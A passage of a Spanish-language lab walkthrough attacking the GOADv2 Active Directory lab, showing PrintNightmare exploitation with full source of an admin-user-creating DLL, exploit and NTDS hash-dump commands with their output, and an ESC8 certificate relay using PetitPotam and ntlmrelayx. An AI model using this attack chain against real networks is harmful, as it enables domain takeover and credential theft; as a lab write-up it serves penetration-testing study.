Ahora vamos a comprobar con crackmapexec si se realizó la creación de el usuario con el comando  `cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.'` y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comandos o en este caso realizar un volcado del archivo NTDS. dit  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.'
SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         essos.local     445    MEEREEN          [+] essos.local\angussmoody:Passw0rd123. (Pwn3d!)
```

con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac) para este caso vamos a hacerlo con crackmapexec con el comando `cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' --ntds`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         essos.local     445    MEEREEN          [+] essos.local\angussmoody:Passw0rd123. (Pwn3d!)
SMB         essos.local     445    MEEREEN          [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         essos.local     445    MEEREEN          Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
SMB         essos.local     445    MEEREEN          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         essos.local     445    MEEREEN          krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
SMB         essos.local     445    MEEREEN          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         essos.local     445    MEEREEN          vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         essos.local     445    MEEREEN          daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
SMB         essos.local     445    MEEREEN          viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
SMB         essos.local     445    MEEREEN          khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
SMB         essos.local     445    MEEREEN          jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
SMB         essos.local     445    MEEREEN          sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
SMB         essos.local     445    MEEREEN          angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
SMB         essos.local     445    MEEREEN          MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a:::
SMB         essos.local     445    MEEREEN          BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:1360f96a3845a2385b97d98f6fefa033:::
SMB         essos.local     445    MEEREEN          SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:d8cdf6de89cfc88ea30464747fb8500f:::
SMB         essos.local     445    MEEREEN          [+] Dumped 14 NTDS hashes to /root/.cme/logs/MEEREEN_essos.local_2023-08-15_202930.ntds of which 11 were added to the database
SMB         essos.local     445    MEEREEN          [*] To extract only enabled accounts from the output file, run the following command: 
SMB         essos.local     445    MEEREEN          [*] cat /root/.cme/logs/MEEREEN_essos.local_2023-08-15_202930.ntds | grep -iv disabled | cut -d ':' -f1
SMB         essos.local     445    MEEREEN          [*] grep -iv disabled /root/.cme/logs/MEEREEN_essos.local_2023-08-15_202930.ntds | cut -d ':' -f1
```

---

## PrintNightmare Windows Server 2019

Ahora vamos a realizar el mismo ataque pero como dice el título en un windows server 2019, se cuenta con dos archivos, pero uno de ellos es detectado por el defender así que en este caso, vamos a ir a la fija con el archivo que realizar el bypass al defender, si quieres ver el archivo anterios puede verlo desde [GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#exploit-on-vulnerable-windows-server-2019-winterfell){:target="_blank"}  para este ejemplo vamos a llamar el archivo como nightmare2.c y como en la exploación anterior, también vamos a crear un usuario llamado angussmoody

```c
/*
 * ADDUSER.C: creating a Windows user programmatically.
 */

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>

DWORD CreateAdminUserInternal(void)
{
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;

    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;

    DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)
    BYTE Sid[256];

    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];

    // Create user
    memset(&ud, 0, sizeof(ud));

    ud.usri1_name        = _T("angussmoody");                // username
    ud.usri1_password    = _T("Test123456789!");             // password
    ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
    ud.usri1_script_path = NULL;

    rc = NetUserAdd(
        NULL,            // local server
        1,                // information level
        (LPBYTE)&ud,
        NULL            // error value
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

   _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);

    // Get user SID
    b = LookupAccountName(
        NULL,            // local server
        ud.usri1_name,   // account name
        Sid,             // SID
        &cbSid,          // SID size
        Domain,          // Domain
        &cbDomain,       // Domain size
        &snu             // SID_NAME_USE (enum)
    );

    if (!b) {
        dw = GetLastError();
        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
        return dw;
    }

    // Add user to "Administrators" local group
    memset(&gd, 0, sizeof(gd));

    gd.lgrmi0_sid = (PSID)Sid;

    rc = NetLocalGroupAddMembers(
        NULL,                    // local server
        _T("Administrators"),
        0,                        // information level
        (LPBYTE)&gd,
        1                        // only one entry
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

    return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateAdminUserInternal();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// RUNDLL32 entry point
#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

// Command-line entry point.
int main()
{
    return CreateAdminUserInternal();
}
```

compilamos el archivo c con el comando `x86_64-w64-mingw32-gcc -shared -o nightmare2.dll nightmare2.c -lnetapi32`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #x86_64-w64-mingw32-gcc -shared -onightmare2.dll nightmare2.c -lnetapi32

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll nightmare2.dll 
Permissions Size User        Date Modified Name
.rwxrwxrwx  252k angussmoody 15 ago 21:09  nightmare2.dll
```

El dominio que vamos a usar para el ataque es north.sevenkingdoms.local que responde a la IP 192.168.56.11

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb north.sevenkingdoms.local
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
```

Como en el ataque anterior vamos a preparar un recurso compartido smb con la dll vemos que lo tenemos en el directorio que vamos a exponer, ahora con el comando `smbserver.py -smb2support share .` nos creamos el recurso compartido

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll nightmare2.dll 
Permissions Size User        Date Modified Name
.rwxrwxrwx  252k angussmoody 15 ago 21:14  nightmare2.dll

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbserver.py -smb2support share .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Antes de hacer el ataque vamos a comprobar que el usuario no existe, para este ataque voy a crear un usuario llamado angussmoody con la contraseña Test123456789! como lo vimos en el archivo nightmare2.c

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!'
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [-] north.sevenkingdoms.local\angussmoody:Test123456789! STATUS_LOGON_FAILURE
```

vamos a realizar el ataque contra north.sevenkingdoms.local que responde a la IP 192.168.56.11 y podemos ver que es un Windows 10.0 Build 17763 x64

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb north.sevenkingdoms.local
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
```

ahora vamos a correr el script con el comando `python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.104\share\nightmare2.dll'` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, y vemos que nos dice exploit Completed (Explotación finalizada)

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.104\share\nightmare2.dll'
[*] Connecting to ncacn_np:winterfell.north.sevenkingdoms.local[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.56.104\share\nightmare2.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Stage2: 0
[+] Exploit Completed
```

también vemos que en nuestro recurso compatido nos realiza una petición desde WINTERFELL

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbserver.py -smb2support share .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.56.11,64355)
[*] AUTHENTICATE_MESSAGE (\,WINTERFELL)
[*] User WINTERFELL\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (192.168.56.11,64355)
[*] Remaining connections []
```

Ahora vamos a comprobar con crackmapexec si se realizó la creación del usuario con el comando  `cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!'` y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comandos o en este caso realizar un volcado del archivo NTDS. dit  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!'
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] north.sevenkingdoms.local\angussmoody:Test123456789! (Pwn3d!)
```

con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac) para este caso vamos a hacerlo con crackmapexec con el comando `cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!' --ntds`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] north.sevenkingdoms.local\angussmoody:Test123456789! (Pwn3d!)
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cb40e0977145cf8cf75899742d9f4fb5:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:2c643546d00054420505a2bf86d77c47:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       angussmoody:1123:aad3b435b51404eeaad3b435b51404ee:c103cafa49983dbcf3d8a1c951f46347:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:0e403cdd0143177b645852aabb7eafb1:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       CASTELBLACK$:1104:aad3b435b51404eeaad3b435b51404ee:9c8155e363254749e2b458b64bbd893e:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       samaccount$:1122:aad3b435b51404eeaad3b435b51404ee:0eddedc35eb7b7ecde0c9f0564e54c83:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:2e0f02c39d6203b52c125858b6feb74c:::
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] Dumped 21 NTDS hashes to /root/.cme/logs/WINTERFELL_winterfell.north.sevenkingdoms.local_2023-08-15_213756.ntds of which 17 were added to the database
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] To extract only enabled accounts from the output file, run the following command: 
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] cat /root/.cme/logs/WINTERFELL_winterfell.north.sevenkingdoms.local_2023-08-15_213756.ntds | grep -iv disabled | cut -d ':' -f1
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] grep -iv disabled /root/.cme/logs/WINTERFELL_winterfell.north.sevenkingdoms.local_2023-08-15_213756.ntds | cut -d ':' -f1
```


# ADCS (Active Directory Certificate Services)

## ESC8 - coerce to domain admin

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2022.png)

Comprobar si la inscripción por Internet funciona en: [http://192.168.56.23/certsrv/certfnsh.asp](http://192.168.56.23/certsrv/certfnsh.asp){:target="_blank"} y ver que pide autenticación, así que se puede probar el ataque.

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2023.png)

Ponerse a la escucha con ntlmrelay utilizando el comando:`ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

Por otra parte, se ejecuta el [petitpotam](https://github.com/topotam/PetitPotam){:target="_blank"} utilizando el comando: `PetitPotam.py 192.168.56.104 meereen.essos.local` Una vez completado, se recibe la confirmación "Attack worked!”

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody]
└──╼ #PetitPotam.py 192.168.56.104 meereen.essos.local 

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:meereen.essos.local[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Cuando se termina de ejecutar el comando, el ntlmrelay proporciona resultados que incluyen información relacionada con el certificado.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Received connection from 192.168.56.12, attacking target http://192.168.56.23
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.56.23 as ESSOS/MEEREEN$ SUCCEED
[*] SMBD-Thread-7: Connection from 192.168.56.12 controlled, but there are no more targets left!
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 5
[*] Base64 certificate of user MEEREEN$: 
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